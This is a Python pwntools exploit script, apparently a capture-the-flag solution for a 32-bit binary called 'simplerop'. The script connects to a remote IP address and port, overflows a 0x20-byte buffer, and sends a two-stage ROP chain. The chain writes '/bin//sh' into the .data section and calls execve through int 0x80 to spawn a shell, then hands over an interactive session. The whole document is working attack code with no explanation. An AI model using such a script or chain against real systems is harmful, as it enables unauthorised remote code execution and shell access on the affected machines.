#!/usr/bin/env python3
from pwn import *
import pwnlib.shellcraft

debug = 0

c = 0
pwn_file = "./simplerop"
# elf = ELF(pwn_file)
if debug == 1:
    c = process(pwn_file)
else:
    c = remote('140.110.112.77', 2126)

context.os='linux'
context.arch = 'i386'
context.terminal = ['tmux', 'splitw', '-h']

if debug == 1:
    gdbcmd = '''
    # b *0x004009e5
    b *0x8048e6e
    '''

    gdb.attach(c, gdbcmd)
    context.log_level ='debug'

context.log_level ='debug'


# execve generated by ROPgadget


# stage 1
p = b'a' * 0x20

p += p32(0x0806e82a) # pop edx ; ret
p += p32(0x080ea060) # @ .data
p += p32(0x080bae06) # pop eax ; ret
p += b'/bin'
p += p32(0x0809a15d) # mov dword ptr [edx], eax ; ret

p += p32(0x0806e82a) # pop edx ; ret
p += p32(0x080ea064) # @ .data + 4
p += p32(0x080bae06) # pop eax ; ret
p += b'//sh'
p += p32(0x0809a15d) # mov dword ptr [edx], eax ; ret

p += p32(0x08048e25) # main

c.sendafter(':', p)

# stage 2
p = b'a' * 0x20

p += p32(0x0806e82a) # pop edx ; ret
p += p32(0x080ea068) # @ .data + 8
p += p32(0x08054250) # xor eax, eax ; ret
p += p32(0x0809a15d) # mov dword ptr [edx], eax ; ret

p += p32(0x080481c9) # pop ebx ; ret
p += p32(0x080ea060) # @ .data
p += p32(0x0806e851) # pop ecx ; pop ebx ; ret
p += p32(0x080ea068) # @ .data + 8
p += p32(0x080ea060) # padding without overwrite ebx

p += p32(0x0806e82a) # pop edx ; ret
p += p32(0x080ea068) # @ .data + 8
p += p32(0x080bae06) # pop eax ; ret
p += p32(11)
p += p32(0x080493e1) # int 0x80



c.sendafter(':', p)


c.interactive()
c.close()

